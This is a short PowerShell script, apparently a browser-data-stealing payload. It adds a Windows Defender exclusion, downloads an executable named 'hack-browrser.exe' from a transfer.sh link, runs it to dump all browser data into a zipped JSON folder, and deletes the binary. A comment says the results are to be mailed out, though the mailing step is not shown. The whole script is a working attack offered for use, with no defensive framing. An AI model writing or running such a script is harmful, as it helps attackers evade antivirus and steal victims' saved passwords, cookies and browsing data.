#Adding windows defender exclusionpath
Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads"
#Creating the directory we will work on
mkdir "$env:USERPROFILE\Downloads\digi"
Set-Location "$env:USERPROFILE\Downloads\digi"
#Downloading and executing hackbrowser.exe
Invoke-WebRequest -Uri "https://transfer.sh/MOVevw/hack-browrser.exe" -OutFile "$env:USERPROFILE\Downloads\digi\hb.exe"
./hb.exe -b all -f json --dir results -zip
Remove-Item -Path "$env:USERPROFILE\Downloads\digi\hb.exe" -Force
#Mailing the output you will need to enable less secure app access on your google account for this to work
Set-Location "$env:USERPROFILE\Downloads\digi\results"
